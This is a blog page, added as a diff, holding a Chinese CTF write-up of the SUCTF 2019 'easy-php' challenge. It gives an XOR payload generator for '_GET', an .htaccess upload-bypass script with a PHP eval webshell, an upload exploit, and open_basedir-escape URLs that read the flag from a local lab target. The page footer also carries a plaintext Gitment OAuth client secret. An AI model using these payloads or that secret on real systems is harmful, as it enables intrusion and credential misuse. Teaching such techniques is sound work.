@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="osword&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      2019SUCTF Easay-php题解记录 | osword&#39;s blog
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>osword's blog</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/links/" class="item-link">Links</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/links/" class="menu-link">Links</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>2019SUCTF Easay-php题解记录</h2>
+  <p class="post-date">2019-08-24 - 
+<span id="busuanzi_container_page_pv" style="color: #fff; margin-left: 0px">阅读量<span id="busuanzi_value_page_pv"></span>次
+        </span></p>
+<div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h1 id="easy-php"><a href="#easy-php" class="headerlink" title="easy-php"></a>easy-php</h1><p>Php的经典特性“Use of undefined constant”，会将代码中没有引号的字符都自动作为字符串</p>
+<p>Ascii码大于 0x7F 的字符都会被当作字符串</p>
+<h2 id="可见字符"><a href="#可见字符" class="headerlink" title="可见字符"></a>可见字符</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">35</span>]: string.printable</span><br><span class="line">Out[<span class="number">35</span>]: <span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&amp;\'()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~ \t\n\r\x0b\x0c'</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">36</span>]: ee=string.printable</span><br><span class="line"></span><br><span class="line">In [<span class="number">37</span>]: a=map(<span class="keyword">lambda</span> x:x.encode(<span class="string">"hex"</span>),list(ee))</span><br><span class="line"></span><br><span class="line">In [<span class="number">38</span>]: print(a)</span><br><span class="line">[<span class="string">'30'</span>, <span class="string">'31'</span>, <span class="string">'32'</span>, <span class="string">'33'</span>, <span class="string">'34'</span>, <span class="string">'35'</span>, <span class="string">'36'</span>, <span class="string">'37'</span>, <span class="string">'38'</span>, <span class="string">'39'</span>, <span class="string">'61'</span>, <span class="string">'62'</span>, <span class="string">'63'</span>, <span class="string">'64'</span>, <span class="string">'65'</span>, <span class="string">'66'</span>, <span class="string">'67'</span>, <span class="string">'68'</span>, <span class="string">'69'</span>, <span class="string">'6a'</span>, <span class="string">'6b'</span>, <span class="string">'6c'</span>, <span class="string">'6d'</span>, <span class="string">'6e'</span>, <span class="string">'6f'</span>, <span class="string">'70'</span>, <span class="string">'71'</span>, <span class="string">'72'</span>, <span class="string">'73'</span>, <span class="string">'74'</span>, <span class="string">'75'</span>, <span class="string">'76'</span>, <span class="string">'77'</span>, <span class="string">'78'</span>, <span class="string">'79'</span>, <span class="string">'7a'</span>, <span class="string">'41'</span>, <span class="string">'42'</span>, <span class="string">'43'</span>, <span class="string">'44'</span>, <span class="string">'45'</span>, <span class="string">'46'</span>, <span class="string">'47'</span>, <span class="string">'48'</span>, <span class="string">'49'</span>, <span class="string">'4a'</span>, <span class="string">'4b'</span>, <span class="string">'4c'</span>, <span class="string">'4d'</span>, <span class="string">'4e'</span>, <span class="string">'4f'</span>, <span class="string">'50'</span>, <span class="string">'51'</span>, <span class="string">'52'</span>, <span class="string">'53'</span>, <span class="string">'54'</span>, <span class="string">'55'</span>, <span class="string">'56'</span>, <span class="string">'57'</span>, <span class="string">'58'</span>, <span class="string">'59'</span>, <span class="string">'5a'</span>, <span class="string">'21'</span>, <span class="string">'22'</span>, <span class="string">'23'</span>, <span class="string">'24'</span>, <span class="string">'25'</span>, <span class="string">'26'</span>, <span class="string">'27'</span>, <span class="string">'28'</span>, <span class="string">'29'</span>, <span class="string">'2a'</span>, <span class="string">'2b'</span>, <span class="string">'2c'</span>, <span class="string">'2d'</span>, <span class="string">'2e'</span>, <span class="string">'2f'</span>, <span class="string">'3a'</span>, <span class="string">'3b'</span>, <span class="string">'3c'</span>, <span class="string">'3d'</span>, <span class="string">'3e'</span>, <span class="string">'3f'</span>, <span class="string">'40'</span>, <span class="string">'5b'</span>, <span class="string">'5c'</span>, <span class="string">'5d'</span>, <span class="string">'5e'</span>, <span class="string">'5f'</span>, <span class="string">'60'</span>, <span class="string">'7b'</span>, <span class="string">'7c'</span>, <span class="string">'7d'</span>, <span class="string">'7e'</span>, <span class="string">'20'</span>, <span class="string">'09'</span>, <span class="string">'0a'</span>, <span class="string">'0d'</span>, <span class="string">'0b'</span>, <span class="string">'0c'</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">39</span>]:</span><br></pre></td></tr></table></figure>
+
+<p>使用不可打印字符来进行异或，生成<code>_GET</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line">pstr=string.printable</span><br><span class="line">hexstr=map(<span class="keyword">lambda</span> x:x.encode(<span class="string">'hex'</span>),list(pstr))</span><br><span class="line">temphex=<span class="keyword">lambda</span> x:str(hex(x))</span><br><span class="line">print(list(pstr))</span><br><span class="line"></span><br><span class="line">_=[]</span><br><span class="line">G=[]</span><br><span class="line">E=[]</span><br><span class="line">T=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> (chr(i) <span class="keyword">not</span> <span class="keyword">in</span> list(pstr)) &amp; (chr(j) <span class="keyword">not</span> <span class="keyword">in</span> list(pstr)):</span><br><span class="line">            tmp=i^j</span><br><span class="line">            <span class="keyword">if</span> chr(tmp)==<span class="string">"_"</span>:</span><br><span class="line">                temp=[]</span><br><span class="line">                temp.append(temphex(j)[<span class="number">2</span>:]+<span class="string">"^"</span>+temphex(i)[<span class="number">2</span>:])</span><br><span class="line">                _.append(temp)</span><br><span class="line">            <span class="keyword">if</span> chr(tmp)==<span class="string">"G"</span>:</span><br><span class="line">                temp=[]</span><br><span class="line">                temp.append(temphex(j)[<span class="number">2</span>:]+<span class="string">"^"</span>+temphex(i)[<span class="number">2</span>:])</span><br><span class="line">                G.append(temp)</span><br><span class="line">            <span class="keyword">if</span> chr(tmp)==<span class="string">"E"</span>:</span><br><span class="line">                temp=[]</span><br><span class="line">                temp.append(temphex(j)[<span class="number">2</span>:]+<span class="string">"^"</span>+temphex(i)[<span class="number">2</span>:])</span><br><span class="line">                E.append(temp)</span><br><span class="line">            <span class="keyword">if</span> chr(tmp)==<span class="string">"T"</span>:</span><br><span class="line">                temp=[]</span><br><span class="line">                temp.append(temphex(j)[<span class="number">2</span>:]+<span class="string">"^"</span>+temphex(i)[<span class="number">2</span>:])</span><br><span class="line">                T.append(temp)</span><br><span class="line"></span><br><span class="line">print(_)</span><br><span class="line">print(G)</span><br><span class="line">print(E)</span><br><span class="line">print(T)</span><br></pre></td></tr></table></figure>
+
+<p>随便拿个payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8877&#x2F;?_&#x3D;$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%df&#125;();&amp;%df&#x3D;phpinfo</span><br></pre></td></tr></table></figure>
+
+<p>这里由于eval函数只能解析一便代码，不能传入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8877&#x2F;?_&#x3D;$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%df&#125;&amp;%df&#x3D;phpinfo();</span><br></pre></td></tr></table></figure>
+
+<h2 id="上传htaccess"><a href="#上传htaccess" class="headerlink" title="上传htaccess"></a>上传htaccess</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># Description : create and bypass file upload filter with .htaccess</span></span><br><span class="line"><span class="comment"># Author : Thibaud Robin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Will prove the file is a legit xbitmap file and the size is 1337x1337</span></span><br><span class="line"><span class="comment">#SIZE_HEADER = b"\n\n#define width 1337\n#define height 1337\n\n"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_php_file</span><span class="params">(filename, script)</span>:</span></span><br><span class="line">    phpfile = open(filename, <span class="string">'wb'</span>) </span><br><span class="line">    phpfile.write(SIZE_HEADER)</span><br><span class="line">    phpfile.write(script.encode(<span class="string">'utf-16be'</span>))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    phpfile.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_htacess</span><span class="params">()</span>:</span></span><br><span class="line">    htaccess = open(<span class="string">'.htaccess'</span>, <span class="string">'wb'</span>)</span><br><span class="line">    htaccess.write(SIZE_HEADER)</span><br><span class="line">    htaccess.write(<span class="string">b'AddType application/x-httpd-php .ppp\n'</span>)</span><br><span class="line">    htaccess.write(<span class="string">b'php_value zend.multibyte 1\n'</span>)</span><br><span class="line">    htaccess.write(<span class="string">b'php_value zend.detect_unicode 1\n'</span>)</span><br><span class="line">    htaccess.write(<span class="string">b'php_value display_errors 1\n'</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.close()</span><br><span class="line">        </span><br><span class="line">generate_htacess()</span><br><span class="line"></span><br><span class="line">generate_php_file(<span class="string">"webshell.ppp"</span>, <span class="string">"&lt;?php eval($_GET['cmd']); die(); ?&gt;"</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>上传<code>.htaccess</code>后上传webshell.ppp</p>
+<p>EXP<br>直接使用requests扩展上传</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://127.0.0.1:8877/?_=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%df&#125;();&amp;%df=get_the_flag"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#file=open("/home/osword/Desktop/.htaccess","rb")</span></span><br><span class="line">file=open(<span class="string">"/home/osword/Desktop/webshell.ppp"</span>,<span class="string">"rb"</span>)</span><br><span class="line">files=&#123;<span class="string">'file'</span>:file&#125;</span><br><span class="line">response=requests.post(url,files=files)</span><br><span class="line">file.close()</span><br><span class="line"><span class="keyword">print</span> response.status_code</span><br><span class="line"><span class="keyword">print</span> response.request.body</span><br><span class="line"><span class="keyword">print</span> <span class="string">'--------------------------------'</span></span><br><span class="line"><span class="keyword">print</span> response.text</span><br></pre></td></tr></table></figure>
+
+<p><img src="./1566634092815.png" alt=""></p>
+<h2 id="disbale-functions过滤不全"><a href="#disbale-functions过滤不全" class="headerlink" title="disbale_functions过滤不全"></a>disbale_functions过滤不全</h2><p><a href="http://127.0.0.1:8877/upload/tmp_2ff4fb82e497844a03adf28cf6bedfde/webshell.ppp?cmd=ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27/%27);var_dump(scandir(%27/%27)" target="_blank" rel="noopener">http://127.0.0.1:8877/upload/tmp_2ff4fb82e497844a03adf28cf6bedfde/webshell.ppp?cmd=ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27/%27);var_dump(scandir(%27/%27)</a>);</p>
+<p><img src="./1566635928733.png" alt=""></p>
+<p><a href="http://127.0.0.1:8877/upload/tmp_2ff4fb82e497844a03adf28cf6bedfde/webshell.ppp?cmd=ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27/%27);readfile(%27/THis_Is_tHe_F14g%27)" target="_blank" rel="noopener">http://127.0.0.1:8877/upload/tmp_2ff4fb82e497844a03adf28cf6bedfde/webshell.ppp?cmd=ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27/%27);readfile(%27/THis_Is_tHe_F14g%27)</a>;</p>
+<p><img src="./1566635895793.png" alt=""></p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.smi1e.top/php%E4%B8%8D%E4%BD%BF%E7%94%A8%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E5%92%8C%E4%B8%8B%E5%88%92%E7%BA%BF%E5%86%99shell/" target="_blank" rel="noopener">https://www.smi1e.top/php%E4%B8%8D%E4%BD%BF%E7%94%A8%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E5%92%8C%E4%B8%8B%E5%88%92%E7%BA%BF%E5%86%99shell/</a></p>
+<p><a href="https://blog.zeddyu.info/2019/07/20/isitdtu-2019/" target="_blank" rel="noopener">https://blog.zeddyu.info/2019/07/20/isitdtu-2019/</a></p>
+<p><a href="https://www.cnblogs.com/wfzWebSecuity/p/11373037.html" target="_blank" rel="noopener">https://www.cnblogs.com/wfzWebSecuity/p/11373037.html</a></p>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#CTF" >
+    <span class="tag-code">CTF</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2019/07/30/Thinkphp5-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E4%BA%8C/">
+        <span class="nav-arrow">← </span>
+        
+          Thinkphp5 远程代码执行(二)
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2019/08/25/zzzphp1-7-0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
+        
+          zzzphp1.7.0远程代码执行
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#easy-php"><span class="toc-nav-text">easy-php</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#可见字符"><span class="toc-nav-text">可见字符</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#上传htaccess"><span class="toc-nav-text">上传htaccess</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#disbale-functions过滤不全"><span class="toc-nav-text">disbale_functions过滤不全</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#参考链接"><span class="toc-nav-text">参考链接</span></a></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://zhzhdoai.github.io/2019/08/24/2019SUCTF-Easay-php题解记录/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+
+
+  <script>
+    var gitmentConfig = "osword";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "2019SUCTF Easay-php题解记录",
+        owner: "osword",
+        repo: "osword.github.io",
+        oauth: {
+          client_id: "7d7576c71632f14d639a",
+          client_secret: "3d7f7e4c0e9a43a2cc5334d68aee612090df8b70"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a href="https://github.com/yanm1ng" target="_blank" rel="noopener">yanm1ng</a>
+  </p>
+    访问量<span id="busuanzi_value_site_pv"></span>,
+    访客数<span id="busuanzi_value_site_uv"></span>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
